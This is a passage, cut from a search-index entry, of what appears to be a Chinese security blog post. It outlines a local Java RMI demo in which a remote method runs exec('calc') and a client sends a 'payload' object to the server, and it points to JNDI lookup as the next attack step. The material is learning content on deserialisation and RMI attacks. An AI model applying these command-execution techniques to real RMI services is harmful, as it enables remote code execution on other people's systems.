class="hljs-string">&quot;calc&quot;</span>) 来执行系统命令，弹出计算器。<br>· sayObject(Object obj) 方法简单地打印传入的对象。<br><br><span class="hljs-number">3</span>、创建并启动RMI服务器 (RMIServer.java):  <br>· 在 main 方法中，创建 RMITestImpl 的实例。<br>· 使用 LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) 创建一个在端口 <span class="hljs-number">8081</span> 上监听的 RMI 注册表。<br>· 将 RMITestImpl 实例绑定到注册表中，名称为 <span class="hljs-string">&quot;EddieMurphy&quot;</span>。<br>· 打印一条消息表示服务器正在监听。<br><br><span class="hljs-number">4</span>、创建并启动RMI客户端 (RMIClient.java):  <br>· 在 main 方法中，使用 LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) 获取服务器的注册表。<br>· 使用 registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) 查找远程对象，并将其强制转换为 RMITest 接口。<br>· 调用 rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) 方法，传递一个 payload 对象。<br>· 调用 rmiTest.testcalc() 方法，执行远程方法，弹出计算器。<br></code></pre></td></tr></table></figure><p>后续的JNDI是重头戏，lookup是典型的特征。那么JNDI结合RMI打法就先留待抛砖引玉吧。</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深 | 素十八 (su18.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
